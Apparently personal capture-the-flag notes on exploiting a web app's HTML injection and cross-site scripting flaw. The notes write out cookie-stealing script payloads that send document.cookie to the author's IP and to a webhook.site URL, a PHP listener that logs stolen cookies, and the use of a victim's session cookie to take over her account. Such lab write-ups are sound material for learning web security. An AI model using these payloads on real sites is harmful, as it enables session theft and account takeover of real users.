I am able to inject HTML code 

`<h1>TESTING</h1>`

![](../images/Pasted%20image%2020261006092216.png)

`<script>alert(document.domain);</script>`


Vuln to XSS as well

![](../images/Pasted%20image%2020261006092332.png)

![](../images/Pasted%20image%2020261006093850.png)

- Tried default admin credentials and didnt work


Grabbed session cookie 

![](../images/Pasted%20image%2020261006095259.png)

eyJ1c2VyIjp7ImlkIjo1LCJ1c2VybmFtZSI6ImhhY2tlciJ9fQ.asSX_Q.6nBDb-MuumRJSe1cCiacjBKK9LE


tried to grab the cookie sending it back to us 

<script>new Image().src="http://10.10.14.100/grabber.php?c="+document.cookie;</script>
<script>document.location='http://10.10.14.100/grabber.php?c='+document.cookie</script>

both payloads worked fine, 

Need to write the collected data to a file 

`<?php`
`$cookie = $_GET['c'];`
`$fp = fopen('cookies.txt', 'a+');`
`fwrite($fp, 'Cookie:' .$cookie."\r\n");`
`fclose($fp);`
`?>`

save this as grabber.php
run a php server 

php -S "ip:80" 

![](../images/Pasted%20image%2020261006102310.png)

apparently this is only grabbing my own cookie as we are not in the same network with the app so it cant call back with the second cookie , our methodology was correct. 

we just had to use a other method to grab the cookie 

<script>document.location='https://webhook.site/3eb7bce2-cc9c-4cc1-9f93-17447292febd?c='+encodeURIComponent(document.cookie)</script>


![](../images/Pasted%20image%2020261006112113.png)

this was the correct session cookie , once we changed it to our we were able to log in to her account and grab the flag! 